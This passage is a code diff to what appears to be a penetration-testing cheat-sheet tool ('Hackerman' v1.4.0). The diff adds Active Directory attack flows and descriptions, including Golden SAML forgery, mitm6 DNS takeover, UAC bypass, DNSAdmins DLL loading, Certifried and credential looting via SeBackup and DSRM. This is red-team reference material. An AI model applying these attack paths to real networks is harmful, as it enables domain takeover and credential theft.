  [`bloodhound-python -u '{{user}}' -p '{{password}}' -d {{domain}} -ns {{dc_ip}} -c DCOnly --zip`,'DCOnly (fast, no sessions)']
 ],note:'<span class="mono">-ns</span> = DNS server (the DC). Add <span class="mono">--dns-tcp</span> if UDP/53 is filtered. Import the generated zip into BloodHound CE via <b>Administration → File Ingest</b>.'});
 
@@ -2413,7 +2541,7 @@ steps:[
  {t:'Enumerate properly',d:'Get the full picture before requesting anything.',r:['adcs-find']},
  {t:'Exploit the template',d:'ESC1 (supplied SAN), ESC4 (rewrite template), ESC2/ESC3 (any-purpose / enrollment agent), ESC7 (CA rights).',r:['adcs-esc1','adcs-esc4','adcs-esc2-esc3','adcs-esc7']},
  {t:'Missing/weak mapping & CA flags',d:'ESC9/ESC16 (no SID extension, UPN swap), ESC10 (Schannel mapping), ESC6 (SAN via request attributes).',r:['adcs-esc9-esc16','adcs-esc10','adcs-esc6']},
- {t:'Relay, OID groups, EKUwu, server auth',d:'ESC11 (RPC relay), ESC13 (linked issuance policy), ESC15 (EKUwu), ESC17 (server-auth SAN), ESC5/12/14 recon.',r:['adcs-esc11','adcs-esc13','adcs-esc15','adcs-esc17','adcs-esc5-esc12-esc14']},
+ {t:'Relay, OID groups, EKUwu, server auth',d:'ESC11 (RPC relay), ESC13 (linked issuance policy), ESC15 (EKUwu), ESC17 (server-auth SAN), ESC5/12/14 recon, Certifried.',r:['adcs-esc11','adcs-esc13','adcs-esc15','adcs-esc17','adcs-esc5-esc12-esc14','cve-certifried']},
  {t:'Relay to the CA',d:'ESC8 if web enrollment over HTTP is exposed.',r:['adcs-esc8','relay-coerce']},
  {t:'Use the certificate',d:'certipy auth gives you the NT hash — then PtH or DCSync. With CA key backup: golden certificate for persistence.',r:['creds-dcsync','adcs-golden-cert']}
 ]},
@@ -2421,7 +2549,7 @@ steps:[
 need:['user'], needAny:['password','nthash','ccache'],
 steps:[
  {t:'Read the ACL and find write rights',d:'Confirm exactly which object/attribute you can write.',r:['dacl-enum','bloodyad-writable']},
- {t:'User takeover',d:'Pick the least destructive option: shadow credentials, targeted kerberoast, password reset, group add.',r:['dacl-genericall-user','dacl-forcechangepassword','shadow-creds']},
+ {t:'User takeover',d:'Pick the least destructive option: shadow credentials, targeted kerberoast, password reset, group add — or a dMSA via BadSuccessor.',r:['dacl-genericall-user','dacl-forcechangepassword','shadow-creds','bloodyad-badsuccessor']},
  {t:'Computer takeover',d:'Shadow credentials on the machine, or RBCD with a rogue computer.',r:['dacl-genericall-computer','rbcd-addcomputer','rbcd-write','rbcd-getst']},
  {t:'Group takeover',d:'Add yourself to the group, then re-authenticate.',r:['dacl-genericall-group']},
  {t:'Domain object (WriteDACL/Owner)',d:'Grant DCSync, take ownership, or abuse AdminSDHolder for protected groups.',r:['dacl-writedacl-dcsync','dacl-writeowner','dacl-adminsdholder']},
@@ -2438,7 +2566,7 @@ steps:[
 ]},
 {id:'nopwn',title:'No credentials — only network access',when:'Internal position, nothing but a Kali box attached to the network.',
 steps:[
- {t:'Poison name resolution',d:'LLMNR/NBT-NS/mDNS — capture hashes from misconfigured clients.',r:['relay-responder']},
+ {t:'Poison name resolution',d:'LLMNR/NBT-NS/mDNS — capture hashes from misconfigured clients. If those are disabled, take over IPv6 DNS with mitm6.',r:['relay-responder','mitm6']},
  {t:'Enumerate anonymously',d:'Null sessions, SMB, DNS.',r:['anon-enum','user-enum']},
  {t:'Kerberos userenum & spray',d:'Valid users via pre-auth errors, then a single-password spray after checking the lockout policy.',r:['kerbrute','pw-spray']},
  {t:'Coerce machine accounts',d:'Make DCs/services authenticate to your listener.',r:['relay-coerce']},
@@ -2449,8 +2577,8 @@ steps:[
 needAny:['password','nthash','ccache'],
 steps:[
  {t:'Enumerate the host',d:'Who am I, what privileges, what is local.',r:['auth-check','pth-check','pe-suites']},
- {t:'Privilege escalation',d:'SeImpersonate etc. → SYSTEM via potato; check AV/Defender first.',r:['post-seimpersonate','av-defender']},
- {t:'Loot local secrets',d:'SAM/LSA/LSASS/DPAPI plus registry autologon and saved creds.',r:['creds-sam-lsa','creds-dpapi','win-registry-loot']},
+ {t:'Privilege escalation',d:'SeImpersonate/UAC/Kerberos relay paths to SYSTEM — check AV/Defender first.',r:['post-seimpersonate','uac-bypass','krbrelay','av-defender']},
+ {t:'Loot local secrets',d:'SAM/LSA/LSASS/DPAPI plus registry autologon, saved creds and SeBackup file copies.',r:['creds-sam-lsa','creds-dpapi','win-registry-loot','sebackup']},
  {t:'Enable remote access',d:'RDP / firewall / reverse shells / file transfer.',r:['lat-rdp','rdp-auth','revshells','lat-transfer']},
  {t:'Move laterally',d:'Reuse hashes and tickets on other hosts.',r:['lat-winrm','lat-smb-exec','lat-impacket-exec']}
 ]},
@@ -2459,6 +2587,7 @@ need:['user'], needAny:['password','nthash','ccache'],
 steps:[
  {t:'Enumerate the trusts',d:'Understand direction and which domain you control.',r:['trust-enum']},
  {t:'Abuse the trust',d:'Trust key extraction + inter-realm golden ticket, or raiseChild.',r:['trust-raisechild']},
+ {t:'Hybrid identity',d:'AD Connect connector accounts (MSOL/ADSync) and AD FS Golden SAML bridge on-prem AD into Entra ID and federated apps.',r:['entra-connect','adfs-goldensaml']},
  {t:'Dump',d:'Once the parent DC accepts your ticket, DCSync it.',r:['creds-dcsync']}
 ]},
 {id:'gpo',title:'I can modify a GPO or ADIDNS',when:'GenericWrite/WriteDACL on a GPO object, or AD-integrated DNS is writable.',
@@ -2474,15 +2603,15 @@ steps:[
  {t:'Dump everything',d:'krbtgt + all hashes.',r:['creds-dcsync']},
  {t:'Forge golden tickets',d:'Persistence that survives password resets — krbtgt or CA key (golden certificate).',r:['golden-ticket','adcs-golden-cert']},
  {t:'Pivot to trusts',d:'Use trust keys and extra SIDs for parent/forest domains.',r:['trust-enum','trust-raisechild']},
- {t:'Extract the rest',d:'Offline ntds parsing and local secrets.',r:['creds-ntds-offline']}
+ {t:'Extract the rest',d:'Offline ntds parsing, DSRM local admin and DNSAdmins plugin abuse for persistence.',r:['creds-ntds-offline','dsrm','dnsadmins']}
 ]}
 );
 /* ===== APPLICABILITY PRIORITIES ===== */
 const PRI_TIERS = {
   4: 'auth-check shares user-enum kerbrute bloodyad-writable kerberos-auth kerberoast ccache-usage adcs-find creds-sam-lsa lat-transfer pe-suites revshells bh-python bh-nxc',
-  3: 'pth-check kerb-check anon-enum pw-spray ldap-dump bloodyad-basics bloodyad-enum bloodyad-groups bloodyad-password asrep gettgt getst golden-ticket deleg-enum rbcd-read rbcd-addcomputer rbcd-write rbcd-getst rbcd-use rbcd-bloodyad constrained-getst adcs-esc1 adcs-esc6 dacl-enum dacl-genericall-user dacl-genericall-computer dacl-genericall-group dacl-forcechangepassword dacl-writedacl-dcsync shadow-creds creds-dcsync creds-dpapi linux-loot win-registry-loot relay-responder relay-smb relay-coerce lat-winrm lat-smb-exec lat-impacket-exec rdp-auth post-seimpersonate av-defender',
-  2: 'session-hunt bloodyad-spn bloodyad-uac keytab targeted-kerberoast silver-ticket ticket-inspect spn-hijack-deleg unconstrained-coerce adcs-esc4 adcs-esc8 adcs-esc2-esc3 adcs-esc9-esc16 adcs-esc10 adcs-esc11 adcs-esc13 adcs-esc15 dacl-writeowner creds-gmsa creds-ntds-offline relay-ldap relay-rbcd relay-socks lat-rdp post-gpo post-adidns mssql-connect mssql-xpcmdshell mssql-impersonate trust-enum',
-  1: 'adcs-esc7 adcs-golden-cert adcs-esc17 adcs-esc5-esc12-esc14 dacl-adminsdholder cve-zerologon cve-nopac cve-printnightmare sccm mssql-linked mssql-coerce mssql-alt-rce trust-raisechild'
+  3: 'pth-check kerb-check anon-enum pw-spray ldap-dump bloodyad-basics bloodyad-enum bloodyad-groups bloodyad-password asrep gettgt getst golden-ticket deleg-enum rbcd-read rbcd-addcomputer rbcd-write rbcd-getst rbcd-use rbcd-bloodyad constrained-getst adcs-esc1 adcs-esc6 dacl-enum dacl-genericall-user dacl-genericall-computer dacl-genericall-group dacl-forcechangepassword dacl-writedacl-dcsync shadow-creds creds-dcsync creds-dpapi linux-loot win-registry-loot relay-responder relay-smb relay-coerce lat-winrm lat-smb-exec lat-impacket-exec lat-impacket-extras rdp-auth post-seimpersonate av-defender uac-bypass',
+  2: 'session-hunt bloodyad-spn bloodyad-uac keytab targeted-kerberoast silver-ticket ticket-inspect spn-hijack-deleg unconstrained-coerce adcs-esc4 adcs-esc8 adcs-esc2-esc3 adcs-esc9-esc16 adcs-esc10 adcs-esc11 adcs-esc13 adcs-esc15 dacl-writeowner creds-gmsa creds-ntds-offline sebackup relay-ldap relay-rbcd relay-socks mitm6 lat-rdp post-gpo post-adidns dsrm dnsadmins bloodyad-badsuccessor mssql-connect mssql-xpcmdshell mssql-impersonate trust-enum',
+  1: 'adcs-esc7 adcs-golden-cert adcs-esc17 adcs-esc5-esc12-esc14 dacl-adminsdholder cve-zerologon cve-nopac cve-printnightmare cve-certifried krbrelay entra-connect adfs-goldensaml sccm mssql-linked mssql-coerce mssql-alt-rce trust-raisechild'
 };
 const FLOW_PRI = {creds:4, nopwn:4, foothold:4, hash:3, aes:3, keytab:3, rbcd:3, constrained:3, adcs:3, dacl:3, da:3, unconstrained:2, mssql:2, trusts:2, gpo:2};
 const PRI = {};
@@ -2555,7 +2684,11 @@ const HELP_TOOL = {
  'kinit': 'Obtains a TGT (password, keytab, PKINIT) into the credential cache.',
  'klist': 'Lists tickets and enctypes from a ccache — the first command when Kerberos misbehaves.',
  'kvno': 'Requests a service ticket purely to verify SPN resolution and key version numbers.',
- 'faketime': 'Runs a command with a faked system time — the KRB_AP_ERR_SKEW workaround for one-shot Kerberos commands.'
+ 'faketime': 'Runs a command with a faked system time — the KRB_AP_ERR_SKEW workaround for one-shot Kerberos commands.',
+ 'mitm6': 'IPv6 DHCPv6/DNS takeover: becomes the DNS server for the network, answers WPAD and feeds authentication to ntlmrelayx.',
+ 'ADFSpoof.py': 'Forges SAML tokens (Golden SAML) from ADFSDump output for o365 or generic saml2 relying parties.',
+ 'roadrecon': 'ROADtools client for Entra ID: authenticate, gather tenant objects/apps/roles (gather) and browse them (gui).',
+ 'bloodhound-ce-python': 'BloodHound CE collector — same data as bloodhound-python, newer package name.'
 };
 const HELP_ATTACK = {
  'trust-raisechild': 'Child domains store a trust key for their parent. With DA in the child you can forge an inter-realm TGT carrying the parent Enterprise Admins SID and authenticate to the parent DC as Administrator — escalation across the trust.',
@@ -2592,6 +2725,17 @@ const HELP_ATTACK = {
  'mssql-impersonate': 'The IMPERSONATE permission lets a low-privileged login execute as another login, often sa.',
  'linux-loot': 'Linux footholds hold Kerberos material (keytabs, ccache files) and application credentials — hunt for them before extracting anything.',
  'keytab': 'A keytab contains the long-term Kerberos keys of its principal. Extracting NTLM/AES gives password-equivalent credentials for that machine or service account.',
+ 'lat-impacket-extras': 'DCOM is an alternative execution path to SMB/WMI: it drives existing COM servers (MMC20.Application, ShellWindows) to spawn processes — useful when service creation or WMI is monitored. The same card covers remote service and registry manipulation.',
+ 'mitm6': 'Responds to DHCPv6 and spoofs DNS over IPv6, so Windows clients resolve your host for WPAD and authenticate to it — combine with ntlmrelayx to relay that auth to LDAP(S).',
+ 'sebackup': 'SeBackupPrivilege (Backup Operators) allows reading any file regardless of ACLs — copy the registry hives for local hashes and ntds.dit for every domain hash.',
+ 'uac-bypass': 'Auto-elevating Windows binaries resolve HKCU classes before launching — write your command there and trigger the binary to get a high-integrity process.',
+ 'dsrm': 'Every DC has a DSRM local Administrator whose hash can be dumped (and set) with local admin rights; with DsrmAdminLogonBehavior=2 it allows network logon as the DC local admin.',
+ 'dnsadmins': 'DNSAdmins control the DNS service plugin DLL (ServerLevelPluginDll): point it at a UNC path and restart the service to load your DLL as SYSTEM on the DC.',
+ 'bloodyad-badsuccessor': 'BadSuccessor abuses Windows Server 2025 dMSA objects: a delegated MSA linked to a privileged account inherits its permissions — create and link one with bloodyAD.',
+ 'cve-certifried': 'CVE-2022-26923: a machine account you own can claim the DC dNSHostName and obtain a Machine certificate for it — on unpatched CAs that logs you in as the DC.',
+ 'krbrelay': 'KrbRelay relays the local machine account Kerberos authentication to LDAP and abuses RBCD or shadow credentials to create a SYSTEM service on the same host — local privesc without domain admin.',
+ 'entra-connect': 'Hybrid identity: the Azure AD Connect server stores the MSOL_ connector account credentials, and that account usually holds DCSync rights in AD.',
+ 'adfs-goldensaml': 'With the AD FS token-signing key you can forge SAML assertions for any user and federated application — MFA does not help because the IdP itself is bypassed.',
  'adcs-esc6': 'The CA allows SAN injection via request attributes (EDITF_ATTRIBUTESUBJECTALTNAME2). If the certificate lacks the SID security extension (ESC9/ESC16) or the DC is unpatched, the SAN UPN wins and PKINIT logs you in as the target.',
  'adcs-esc9-esc16': 'ESC9: a template omits the SID security extension; ESC16: the CA disables it globally. Swap a writeable victim UPN to the target, request a certificate as the victim, revert the UPN, then authenticate with -username to land as the target.',
  'adcs-esc10': 'Schannel on the target maps certificates by UPN (CertificateMappingMethods 0x4). Set the victim UPN to the DC machine account, obtain a certificate as the victim and open an LDAPS shell as the DC.',
@@ -2689,7 +2833,7 @@ function zshEmit(data){
   const fnName = n => '_hk_' + n.replace(/[^A-Za-z0-9_]/g, '_');
   const q = s => "'" + String(s).replace(/'/g, "'\\''") + "'";
   let out = '#compdef ' + names.join(' ') + '\n';
-  out += '# Hackerman v1.3.0 — generated from index.html. Regenerate: "zsh" button in the header or tools/gen-zsh-completions.mjs\n\n';
+  out += '# Hackerman v1.4.0 — generated from index.html. Regenerate: "zsh" button in the header or tools/gen-zsh-completions.mjs\n\n';
   out += '_hackerman() {\n  local tool=${words[1]:t}\n  case $tool in\n';
   names.forEach(n => { out += '    ' + n + ') ' + fnName(n) + ' ;;\n'; });
   out += '  esac\n}\n\n';
